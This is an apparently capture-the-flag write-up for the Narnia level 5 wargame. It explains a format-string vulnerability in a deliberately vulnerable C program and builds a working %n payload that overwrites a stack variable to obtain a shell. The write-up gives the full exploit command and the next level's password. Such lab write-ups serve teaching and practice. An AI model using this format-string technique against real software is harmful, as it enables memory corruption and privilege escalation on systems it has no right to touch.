# Overview
We get the following C code:
```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
```

Check out the line:
```c
	snprintf(buffer, sizeof buffer, argv[1]);
```

`snprintf()` expects a variable number of arguments:
- a pointer to the destination buffer
- the destination buffer length
- a pointer to the format string
- a variable number of arguments, matching conversion specifiers in the format string

Here, we control the format string, however the call to `snprintf()` does not include the extra arguments to match the conversion specifiers that we may add in the format string. But `snprintf()` doesn't know that, and will just read values from the stack. This is a classic format string vulnerability, which is well explained in https://axcheron.github.io/exploit-101-format-strings/.

# Writing arbitrary values to the stack
Here we need to exploit the bug to overwrite the stack variable `i`. It's possible to use a format string vulnerability to do just that, however the process is a bit convoluted.

First, the conversion specifier `%n` can be used to write data at an arbitary address. This specifier writes the number of characters written so far to the address indicated by the pointer argument. For instance:
```c
printf("AAAA%n", &count);
```

writes 4 into the variable count. That's great, but here we can't pass a pointer argument to `snprintf()`, so how can we specify an address? The answer is to pass it in the format string itself, and to use an explicit argument index. Explicit argument indices use the form `%<n>$` instead of `%`, and tell the `printf()` function to use the n-th argument instead of just the next argument.

First consider the stack layout when calling `printf("<address of i>%<n>$n");`:
```
  esp --> +--------------------------+
          | pointer to format string |--\
          +--------------------------+  |
          |                          |  |
          |                          |  |
                      ...               |
          |                          |  |
          +--------------------------+  |
          |            i             |  |
          +--------------------------+  |          
          |                          |  |
                      ...               |
          |                          |  |
          +--------------------------+  |
          |       format string      |<-/
          | (<address of i>%<n>$n)   |
          +--------------------------+
          |                          |                    
```

When called `printf()` does the following:
- it prints the four bytes of `i` address
- then it processes the `%n` specifier. By default, it would use the stack argument just following the pointer to format string. But if we use `%<n>$n` form, we can specify an offset and have `printf()` read the argument further down the stack. More precisely, we can get `printf()` to read the target address from the format string itself. And so it writes 4 into `i`.

# But it's snprintf vs printf
Indeed, so the stack actually looks like:
```
  esp --> +--------------------------+
          | pointer to dst buffer    |--\
          +--------------------------+  |
          |    size of dst buffer    |  |
          +--------------------------+  |
          | pointer to format string |----\
          +--------------------------+  | |
          |        dst buffer        |<-/ |                              
          |                          |    |
          |                          |    |
          |                          |    |
          |                          |    |
          |                          |    |
          +--------------------------+    |
          |            i             |    |
          +--------------------------+    |
          |                          |    |
                      ...                 |
          |                          |    |
          +--------------------------+    |
          |       format string      |<---/
          |                          |
          +--------------------------+
          |                          |                    
```

Also there was something weird about the format string: its address varies depending on its length, also it address is not 4-byte aligned. This makes it difficult to use the `%<n>$n` form. However `snprintf()` writes characters to the destination buffer, so we can read i's address from the destination buffer instead of the format string.

So let's pass `<address of i>%1$n` as `argv[1]`, then `snprintf()` does the following:
- it writes `<address of i>` to the destination buffer
- when processing the `%n` identifier, it uses the 1-th argument, i.e. the destination buffer. The first 4 bytes in destination buffer now contains the address of i, so `snprintf()` writes 4 to i.

Getting better and better, however we need to write 500 to i. We could just put 496 additional characters in the format string but that's tedious. Instead we can use a specifier with a field with, that padds a value with spaces (i.e. `%496x`). So the full payload becomes:
```
<address of i>%496x%1$n
```

`narnia5` prints out the address of i, so we can copy it from there.

To pass the payload to `narnia5`, use the following command:
```sh
/narnia/narnia5 $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90\xd2\xff\xff%496x%1\x24n')")
```

# The end
Password for the next level is `BNSjoSDeGL`.
